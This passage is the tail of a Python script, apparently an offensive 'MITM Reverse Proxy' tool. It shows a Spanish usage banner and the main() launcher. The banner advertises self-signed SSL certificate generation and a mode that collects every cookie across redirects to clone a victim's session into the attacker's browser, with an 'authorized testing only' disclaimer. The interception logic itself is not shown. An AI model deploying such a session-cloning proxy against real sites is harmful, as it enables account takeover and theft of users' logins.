{'MITM Reverse Proxy v2.0'.center(70)}
{'='*70}{RST}
  {Y}Uso:{RST}
    python3 {sys.argv[0]} --target ejemplo.com
    python3 {sys.argv[0]} --target ejemplo.com --port 9090
    python3 {sys.argv[0]} --target ejemplo.com --ssl
    python3 {sys.argv[0]} --target ejemplo.com --ssl-cert c.pem --ssl-key k.pem
    python3 {sys.argv[0]} --target ejemplo.com --fr
    python3 {sys.argv[0]} --target ejemplo.com -O output.txt
    python3 {sys.argv[0]} --target ejemplo.com -O

  {CY}Flags:{RST}
    --ssl                Auto-generate self-signed SSL certificate
    --fr                 Follow redirects + clone ALL cookies from each hop
    --ssl-cert <file>    Custom SSL certificate
    --ssl-key <file>     Custom SSL key
    -O [file]            Save full log to file (auto-generate if no file)

  {CY}Modo Normal vs --fr:{RST}
    {W}Normal:{RST} Sigue redirects pero solo envia cookies de respuesta final
    {W}--fr:{RST}   Sigue redirects y acumula TODAS las cookies de cada hop
            Clona sesion completa al navegador (fix login issues)

  {R}Solo para pruebas autorizadas.{RST}
{M}{'='*70}{RST}
""")

    target = _arg('--target')
    port = int(_arg('--port', '8080'))
    sc = _arg('--ssl-cert')
    sk = _arg('--ssl-key')
    use_ssl = _has_flag('--ssl')
    follow_redirects = _has_flag('--fr')
    
    # Output file
    output_file = None
    if '-O' in sys.argv:
        idx = sys.argv.index('-O')
        if idx + 1 < len(sys.argv) and not sys.argv[idx + 1].startswith('-'):
            output_file = sys.argv[idx + 1]
        else:
            output_file = f"mitm_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        print(f"  {G}[+] Output log: {output_file}{RST}")

    if not target:
        target = input(f"  {CY}URL objetivo: {RST}").strip()
        if not target: print("[-] Requerida"); sys.exit(1)
    p = input(f"  {CY}Puerto [{port}]: {RST}").strip()
    if p:
        try: port = int(p)
        except: pass

    if use_ssl and not (sc and sk):
        cert_dir = os.path.join(BASE, "ssl")
        os.makedirs(cert_dir, exist_ok=True)
        sc = os.path.join(cert_dir, "cert.pem")
        sk = os.path.join(cert_dir, "key.pem")
        if not os.path.exists(sc) or not os.path.exists(sk):
            _gen_ssl_cert(sc, sk)

    proxy = MITMProxy(target, port, sc, sk, follow_redirects, output_file)
    
    cli_thread = threading.Thread(target=_interactive_cli, args=(proxy,), daemon=True)
    cli_thread.start()
    
    proxy.start()

if __name__ == "__main__":
    main()
